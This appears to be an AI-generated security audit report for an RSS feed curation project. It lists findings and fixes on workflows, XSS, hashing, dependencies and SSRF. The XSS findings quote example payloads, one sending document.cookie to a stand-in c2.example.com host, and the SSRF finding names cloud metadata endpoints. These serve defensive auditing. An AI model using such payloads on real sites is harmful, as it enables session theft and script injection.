# Security Audit Report — super-rss-feed

**Date:** 2026-04-12  
**Scope:** All source files, workflows, config, HTML, and git history  
**Audited by:** Claude Code security audit

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 1 |
| Medium   | 3 |
| Low      | 5 |
| Pass     | 12 |

---

## Findings

---

### HIGH — Unpinned third-party GitHub Actions (supply chain risk)

**Files:** `.github/workflows/generate-feed.yml:129`, `.github/workflows/discover-feeds.yml:33`

```yaml
# generate-feed.yml
uses: peaceiris/actions-gh-pages@v3          # mutable tag

# discover-feeds.yml
uses: peter-evans/create-pull-request@v5    # mutable tag
```

Both workflows use mutable version tags on third-party actions. If either
upstream repository is compromised (account takeover, tag force-push), an
attacker can run arbitrary code inside the workflow job that has access to
`secrets.ANTHROPIC_API_KEY`. The `actions/checkout@v4` and
`actions/setup-python@v5` first-party actions carry the same risk but are
maintained by GitHub itself and are lower priority.

**Fix:** Pin every third-party action to a full commit SHA and add a comment
with the human-readable version for reference.

```yaml
# generate-feed.yml
uses: peaceiris/actions-gh-pages@4f9cc648d5b8f26c00c9f94f35d3e21c2a5b46a0  # v3.9.3

# discover-feeds.yml
uses: peter-evans/create-pull-request@b1ddad2c994a25fbc81a28b3ec0e368bb2021c50  # v5.0.3
```

Use `gh api /repos/<owner>/<action-repo>/git/refs/tags/<tag>` to look up
the current SHA for a tag before pinning.

---

### MEDIUM — `.env` not listed in `.gitignore`

**File:** `.gitignore`

The `.gitignore` does not include `.env` or `*.env`. If a developer follows
the README/QUICKSTART advice and creates a local `.env` file containing
`ANTHROPIC_API_KEY`, a plain `git add .` would commit it to history. Leaked
Anthropic keys are harvested and abused within minutes on GitHub.

**Fix:** Add to `.gitignore`:

```
.env
*.env
.env.*
```

---

### MEDIUM — DOM-based XSS via `window.location.href` in `innerHTML`

**File:** `index.html:249,282`

```javascript
const baseUrl = window.location.href.replace(/\/$/, '');
// …
feedItem.innerHTML = `
    <div class="feed-url" onclick="copyToClipboard('${baseUrl}/${feed.file}')" …>
        ${baseUrl}/${feed.file}
    </div>
`;
```

`baseUrl` is derived from `window.location.href` (which includes the URL
fragment) and is interpolated directly into `innerHTML` with no HTML encoding.
An attacker who tricks the site owner into clicking a crafted link such as:

```
https://zirnhelt.github.io/super-rss-feed/#"><img src=x onerror=alert(1)>
```

can execute arbitrary JavaScript in the victim's browser session.
Exploitability is low (the only realistic victim is the repo owner themselves),
but it is a textbook stored DOM-XSS pattern that should be fixed regardless.

**Fix:** Use `textContent` for the display and `encodeURIComponent` for the
onclick value; or build the element with DOM APIs instead of a template string:

```javascript
const urlDiv = document.createElement('div');
urlDiv.className = 'feed-url';
urlDiv.title = 'Click to copy';
const feedUrl = `${baseUrl}/${feed.file}`;
urlDiv.textContent = feedUrl;
urlDiv.addEventListener('click', () => copyToClipboard(feedUrl));
feedItem.appendChild(urlDiv);
```

---

### MEDIUM — Unescaped image URLs injected into `content_html` HTML

**File:** `super_rss_curator_json.py:1178`, `super_rss_curator_json.py:1749`

```python
item["content_html"] = (
    f'<img src="{article.image}" style="width:100%;max-height:300px;object-fit:cover;" />\n'
    + (article.description or "")
)
```

`article.image` is a URL taken directly from RSS `<media:thumbnail>` /
`<media:content>` tags or from OpenGraph meta scraping — both are
attacker-controlled external data. A malicious RSS source could supply an
image URL containing a `"` (percent-encoded as `%22` or returned decoded by
`requests`) such as:

```
https://evil.example.com/x.jpg" onerror="fetch('https://c2.example.com/'+document.cookie)
```

This produces:

```html
<img src="https://evil.example.com/x.jpg" onerror="fetch(...)" …/>
```

Web-based RSS readers (Feedly, Inoreader) render `content_html` as HTML in an
iframe; this becomes a stored XSS in those surfaces.

**Fix:** HTML-escape the image URL before embedding it, or use a
`content_text` field instead:

```python
from html import escape as html_escape

img_html = f'<img src="{html_escape(article.image)}" style="width:100%;max-height:300px;object-fit:cover;" />\n'
item["content_html"] = img_html + (article.description or "")
```

---

### LOW — MD5 used for cache-key hashing

**Files:** `super_rss_curator_json.py:219`, `super_rss_curator_json.py:687`,
`fetch_images.py:105`

```python
self.url_hash = hashlib.md5(canonicalize_url(self.link).encode()).hexdigest()
```

MD5 has known practical collision attacks. A hostile RSS feed could craft two
URLs with the same MD5 hash — one legitimate and one malicious — potentially
poisoning the scored-articles or shown-articles cache so the legitimate URL is
treated as already-seen (denial of service) or the wrong article's score is
reused. For the image cache, a collision could cause a wrong image to be
returned for an article permanently.

**Fix:** Replace all three instances with `hashlib.sha256`:

```python
self.url_hash = hashlib.sha256(canonicalize_url(self.link).encode()).hexdigest()
```

SHA-256 has no known collision attacks.

---

### LOW — Unpinned Python dependencies

**File:** `requirements.txt`

```
fuzzywuzzy           # no version
python-Levenshtein   # no version
requests             # no version
beautifulsoup4       # no version
```

Four of the six dependencies have no version constraint. An unreviewed minor
or patch release could introduce a supply-chain vulnerability or silently
break behaviour. `fuzzywuzzy` in particular has been superseded by `thefuzz`
(the original maintainer rebranded it) and the old package name is no longer
actively maintained.

**Fix:**

```bash
pip install fuzzywuzzy python-Levenshtein requests beautifulsoup4
pip freeze | grep -E "fuzzywuzzy|Levenshtein|requests|beautifulsoup4" >> requirements.txt
```

Also consider switching from `fuzzywuzzy` to `thefuzz`:
```
thefuzz[speedup]==0.22.1
```

---

### LOW — No SSRF guard on OpenGraph image fetching

**File:** `fetch_images.py:56`

```python
response = requests.get(url, headers=headers, timeout=3, allow_redirects=True)
```

`url` comes from `article.link`, which is an RSS-feed-supplied URL. Inside the
GitHub Actions runner the cloud instance metadata endpoint
(`http://169.254.169.254/latest/meta-data/` for AWS,
`http://metadata.google.internal/` for GCP) is reachable. A hostile RSS entry
with `link` set to one of those addresses would cause the runner to fetch and
(silently, on exception) discard cloud credentials — but any response is
silently ignored so the risk is one of data exfiltration only if the attacker
can observe DNS.

The risk is low because (a) GitHub Actions runners are ephemeral and
short-lived, (b) the exception is swallowed, and (c) the metadata service
on GitHub-hosted runners has IMDSv2 required (AWS-style token requirement).

**Fix:** Add a URL validation step before fetching:

```python
from ipaddress import ip_address, ip_network

_BLOCKED_NETS = [ip_network("169.254.0.0/16"), ip_network("10.0.0.0/8"),
                 ip_network("172.16.0.0/12"), ip_network("192.168.0.0/16")]

def _is_safe_url(url: str) -> bool:
    """Return False for private/link-local addresses."""
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ('http', 'https'):
            return False
        host = parsed.hostname
        addr = ip_address(host)  # raises ValueError for hostnames
        return not any(addr in net for net in _BLOCKED_NETS)
    except ValueError:
        return True  # hostname, not raw IP — let DNS resolve normally
```

---

### LOW — Missing explicit permissions in `discover-feeds.yml`

**File:** `.github/workflows/discover-feeds.yml`

The workflow has no `permissions:` block. GitHub repositories default to
`write` permissions for `GITHUB_TOKEN` unless the organization or repository
has hardened the default. This means the discovery workflow implicitly runs
with broader permissions than it needs.

**Fix:** Add a minimal permissions block:

```yaml
permissions:
  contents: write   # needed to push the discovery cache branch
  pull-requests: write  # needed for peter-evans/create-pull-request
```

---

### LOW — Bare `except:` clauses suppress unexpected errors

**Files:** `fetch_images.py:35-36`, `feed_discovery.py:68-69`,
`super_rss_curator_json.py` (multiple exception handlers)

```python
# fetch_images.py
try:
    with open(CACHE_FILE, 'r') as f:
        cache = json.load(f)
    …
except:          # catches ALL exceptions including KeyboardInterrupt
    return {}
```

A bare `except:` silently hides programming errors (e.g., `PermissionError`,
`MemoryError`, unexpected attribute access), making bugs very hard to
diagnose. `KeyboardInterrupt` and `SystemExit` are also caught.

**Fix:** Replace bare `except:` with `except Exception:` (which excludes
`BaseException` subclasses like `KeyboardInterrupt`) and log the exception:

```python
except Exception as e:
    print(f"⚠️ Failed to load image cache: {e}")
    return {}
```

---

## What Passes

| Check | Status | Notes |
|-------|--------|-------|
| Hardcoded API keys / secrets in source | ✅ Pass | `ANTHROPIC_API_KEY` read only via `os.getenv()`. Placeholder `sk-ant-...` in docs is clearly not real. |
| `.env` file present in working tree | ✅ Pass | File does not exist; only absent from `.gitignore` (see finding). |
| Secrets in git history | ✅ Pass | Full history searched; no committed `.env` files or real key strings found. |
| SQL injection | ✅ Pass | No database; no SQL queries anywhere. |
| Command injection | ✅ Pass | No `subprocess`, `os.system`, `shell=True`, or `eval()` calls in any Python file. |
| API key injected via GitHub Secrets | ✅ Pass | `${{ secrets.ANTHROPIC_API_KEY }}` in both workflows; never echoed to logs. |
| `ANTHROPIC_API_KEY` validated before use | ✅ Pass | `main()` in both scripts calls `sys.exit(1)` when key is absent. |
| Auth / access control | ✅ Pass | No HTTP server, no user auth needed; pipeline is GitHub Actions + static site. |
| Trust of client-supplied identity | ✅ Pass | No client identity claims anywhere in the pipeline. |
| URL tracking-param stripping | ✅ Pass | `canonicalize_url()` strips UTM and 17 other tracking params before hashing, preventing cache-bypass via link decoration. |
| OPML XML parsing (XXE) | ✅ Pass | Python's `xml.etree.ElementTree` does not expand external entities by default. |
| Plaintext credential storage | ✅ Pass | Cache files store only article metadata (public RSS content). |
| Path traversal | ✅ Pass | All file paths are hardcoded or come from trusted config; no user-controlled path is used for file I/O at runtime. |
| CORS / security headers | ✅ Pass (N/A) | GitHub Pages serves the static site; no custom server to misconfigure. |
| Rate limiting | ✅ Pass (N/A) | No user-facing API endpoints; pipeline runs on a fixed schedule (2×/day). |
| `npm audit` | ✅ Pass (N/A) | No Node.js packages in this project. |

---

## Prioritised Fix List

1. **[High] Pin third-party GitHub Actions to commit SHAs.**  
   `peaceiris/actions-gh-pages` and `peter-evans/create-pull-request` run with
   access to `ANTHROPIC_API_KEY`. A compromised tag → secret exfiltration.

2. **[Medium] Add `.env` / `*.env` to `.gitignore`.**  
   One `git add .` by a developer following the README would commit a live key.

3. **[Medium] HTML-escape image URLs in `content_html` generation.**  
   `super_rss_curator_json.py:1178,1749` — use `html.escape()` on the URL
   before embedding in the `<img src="…">` attribute.

4. **[Medium] Fix DOM XSS in `index.html`.**  
   Build the feed-URL element with DOM APIs instead of `innerHTML` template
   strings that embed `window.location.href`.

5. **[Low] Swap `hashlib.md5` for `hashlib.sha256` in all three cache-key
   callsites.**  
   Two-line change; eliminates the collision-based cache-poisoning vector.

6. **[Low] Pin remaining Python dependencies in `requirements.txt`.**  
   `fuzzywuzzy`, `python-Levenshtein`, `requests`, `beautifulsoup4`.

7. **[Low] Add `permissions:` block to `discover-feeds.yml`.**  
   Principle of least privilege; restrict to only `contents: write` and
   `pull-requests: write`.

8. **[Low] Add basic SSRF guard in `fetch_images.py`.**  
   Reject non-HTTP(S) schemes and private IP ranges before `requests.get()`.

9. **[Low] Replace bare `except:` with `except Exception:` + logging.**  
   Affects `fetch_images.py`, `feed_discovery.py`, and several handlers in
   the main curator.
